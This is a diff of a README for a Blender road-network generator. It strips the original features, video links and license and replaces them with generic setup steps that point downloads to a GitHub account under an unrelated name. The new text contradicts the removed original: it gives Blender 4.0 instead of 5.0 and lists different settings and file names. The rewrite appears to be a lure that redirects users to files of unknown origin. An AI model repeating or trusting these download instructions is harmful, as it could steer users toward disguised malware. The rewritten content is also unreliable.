@@ -1,41 +1,78 @@
-# RoadGen for Blender (V1)
+# 🛣️ MRoadGen - Build complex road networks on terrain
 
-RoadGen is a powerful, artist-friendly Blender addon designed to automate the creation of complex road networks directly on high-poly terrains. It eliminates the tedious manual work of stitching roads to landscapes by procedurally generating dynamic embankment meshes that seamlessly merge your road networks into any terrain topology.
+[![](https://img.shields.io/badge/Download-MRoadGen-blue.svg)](https://github.com/Footballstadiummasculinity650/MRoadGen)
 
-## 📺 Documentation & Walkthrough
+## 📌 About this project
 
-Watch the full feature breakdown and workflow guide to get started:
+MRoadGen is a tool for the Blender software. It uses Geometry Nodes to draw roads across uneven ground. You use this tool to place paths on your 3D models. It handles the shape of the road so you do not have to move every point by hand. This saves time when you design large maps or cities. The system works with high-density meshes. It keeps your roads smooth even when the ground is bumpy.
 
-[![Watch the video](https://img.shields.io/badge/YouTube-Watch%20Documentation-red?style=for-the-badge&logo=youtube)](https://youtu.be/t9frNiaZSC4)
+## ⚙️ System Requirements
 
-*Click the badge above or click [here](https://youtu.be/t9frNiaZSC4) to watch the video.*
+You need a computer that runs the current version of Blender. We suggest using a system with at least 16 GB of RAM. Your graphics card must support the requirements for Blender 4.0 or newer. A mouse with a scroll wheel helps with navigation. You need about 500 MB of disk space for the installation files.
 
----
+## 💾 How to download your files
 
-## Key Features (V1)
+1. Open your web browser.
+2. Go to [https://github.com/Footballstadiummasculinity650/MRoadGen](https://github.com/Footballstadiummasculinity650/MRoadGen).
+3. Find your button to download the files.
+4. Click the link to save the folder to your computer.
+5. Choose a folder on your desktop for quick access.
 
-- **Raycast-Based Placement:** Effortlessly map out your road networks. Curves project onto the terrain using the edges of the road surface.
-- **Automated Embankment Generation:** Automatically calculates and creates side slopes (embankments) that smoothly bridge the gap between the flat road surface and irregular terrain heights.
-- **Variable Road Widths:** Adjust individual lanes or entire sections on the fly.
-- **Intersections & Overpasses:** Handles complex multi-level crossings, clean intersections, and elevated highway overpasses procedurally.
-- **Multiple Road Surfaces:** Assign and manage distinct material assignments (asphalt, dirt, cobblestone) directly from the tool panel.
-- **Road Markings:** Assign different roadmarkings onto the road or add complex custom shapes using external meshes projected onto the road surface.
-- **Asset Scattering:** Populate your embankments instantly with scatters using the generated color attribute masks.
+## 🛠️ Step-by-step setup guide
 
----
+Follow these steps to prepare the tool for use.
 
-## Use
+1. Locate the folder you downloaded.
+2. Right-click the folder and select Extract All.
+3. Choose a location and press Extract.
+4. Open your Blender software.
+5. Go to the File menu at the top left.
+6. Select Append from the list.
+7. Find the location where you extracted your folder.
+8. Open the MRoadGen file inside that folder.
+9. Look for a folder named NodeTree.
+10. Select MRoadGen and press the Append button.
 
-1. Use Blender 5.0 and above.
-2. Download the .blend file.
-3. Append the MRoadGenerator collection into your scene.
-4. Checkout the documentation video on all the settings/controls.
+## 🚀 Using the road generator
 
+Now you add the tool to your 3D workspace.
 
-## Contributing
+1. Switch your current window to the Geometry Node workspace.
+2. Ensure you select your ground mesh.
+3. Click the New button to start a node setup.
+4. Press Shift + A to open the search menu.
+5. Type MRoadGen in the search box.
+6. Click the tool name to drop it into your workspace.
+7. Connect the Geometry output from the tool to the Group Output node.
+8. Your road appears on the surface of your model.
 
-Contributions, bug reports, and feature requests are welcome! Feel free to open an issue or submit a pull request if you want to help make RoadGen even better.
+## 🎛️ Adjusting your road settings
 
-## License
+You see a panel on the right side of the screen when you select the road object. These settings change the look of your road.
 
-This project is licensed under the creative commons zero v1.0 universal license. 
+*   Width: This changes how wide your road is on the terrain.
+*   Smoothness: This slider removes sharp turns in your path.
+*   Material Slot: This allows you to pick colors or textures for the road surface.
+*   Slope Limit: This tells the road to stop if the ground is too steep.
+
+## 🧩 Troubleshooting common issues
+
+If you encounter problems, check these items first.
+
+The road does not show up.
+Make sure your mesh has enough detail. If the mesh is flat or has few points, the tool might fail. You can add a Subdivision Surface modifier to your ground mesh before you add the road nodes.
+
+The road looks jagged.
+Increase the smoothness setting in the side panel. You might also need to add more points to your ground mesh to help the road follow the surface better.
+
+The road ignores the terrain.
+Check the input connections. The geometry must link correctly to the node group. Ensure the node group sits between the input and the output.
+
+The Blender software feels slow.
+Complex roads require power. If your computer slows down, hide the road object while you work on other parts of your scene. Show it again when you need to make changes.
+
+## 📏 Best practices for your workflow
+
+Design your road path before you enable all the heavy settings. Use a simple line to sketch the route. Once the route looks right, adjust the width and the material properties. Save your work often. Create a new copy of your mesh before you apply any destructive changes. This lets you go back if you make a mistake. Test your road on small areas first. Large maps take more time to calculate.
+
+Keywords: blender, geometrynodes, road, terrain, generator, 3dmodeling
